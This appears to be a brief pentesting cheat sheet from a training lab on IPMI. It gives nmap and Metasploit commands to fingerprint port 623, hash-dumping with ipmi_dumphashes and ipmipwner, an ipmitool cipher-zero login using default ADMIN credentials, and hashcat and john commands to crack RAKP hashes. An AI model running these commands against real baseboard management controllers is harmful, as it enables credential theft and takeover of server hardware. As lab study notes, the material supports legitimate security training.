- [ ] IPMI Footprinting
- [ ] Exploitation

IPMI Footprinting!!!
```sh
# nmap
nmap -sU -T4 -v -p623 IP
nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
# msf
use auxiliary/scanner/ipmi/ipmi_version
```
Exploitation!!!
```sh
# msf
use auxiliary/scanner/ipmi/ipmi_dumphashes 
# ipmipwner
python3 ipmipwner.py --host 10.129.202.5
# ipmi tool
ipmitool -I lanplus -C 0 -H 172.16.9.25 -U ADMIN -P ADMIN user list
# flow in the RAKP protocol in IPMI 2.0
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
john ipmi.txt
```
References!!!
```
https://gbe0.com/posts/security/cracking-ipmi-passwords/
```